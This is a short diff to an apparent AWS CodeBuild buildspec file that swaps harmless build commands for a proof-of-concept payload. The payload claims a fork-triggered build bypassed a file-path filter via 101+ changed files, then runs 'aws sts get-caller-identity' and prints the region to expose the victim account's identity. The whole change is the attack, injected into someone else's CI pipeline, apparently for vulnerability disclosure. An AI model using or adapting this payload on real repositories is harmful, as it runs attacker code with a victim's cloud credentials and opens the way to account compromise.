@@ -2,5 +2,10 @@ version: 0.2
 phases:
   build:
     commands:
-      - echo "Legitimate build running"
-      - echo "Build completed successfully"
+      - echo "=== FILE_PATH BYPASS CONFIRMED ==="
+      - echo "This build was triggered from FORK by external attacker (tap198)"
+      - echo "FILE_PATH filter was bypassed via 101+ changed files"
+      - echo "Victim account credentials:"
+      - aws sts get-caller-identity 2>&1 || true
+      - echo "Region: $AWS_DEFAULT_REGION"
+      - echo "=== EXPLOIT SUCCESSFUL ==="
